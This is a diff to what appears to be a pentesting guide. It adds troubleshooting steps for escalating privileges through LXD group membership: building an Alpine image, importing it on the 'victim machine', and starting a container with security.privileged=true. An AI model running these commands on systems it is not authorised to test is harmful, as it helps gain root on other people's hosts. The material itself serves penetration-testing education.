@@ -24,6 +24,8 @@ cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
+
+# If that fails, run it adding -o image.release=3.8 at the end.
 ```
 
 Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
@@ -61,8 +63,21 @@ Build an Alpine image and start it using the flag `security.privileged=true`, fo
 git clone https://github.com/saghul/lxd-alpine-builder
 ./build-alpine -a i686
 
+# If you got error
+ERROR: unsatisfiable constraints:
+  alpine-base (missing):
+    required by: world[alpine-base]
+Failed to install rootfs
+
+# Maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
+1.) Edit the file rootfs/usr/share/alpine-mirrors/Mirrors.txt deleting all the entries but the first one, do the same with mirrors.yaml.
+2.) Again run - sudo ./build-alpine -a i686
+
 # import the image
-lxc image import ./alpine.tar.gz --alias myimage
+lxc image import ./alpine.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+# before running the image, start and configure the lxd storage pool as default 
+lxd init
 
 # run the image
 lxc init myimage mycontainer -c security.privileged=true
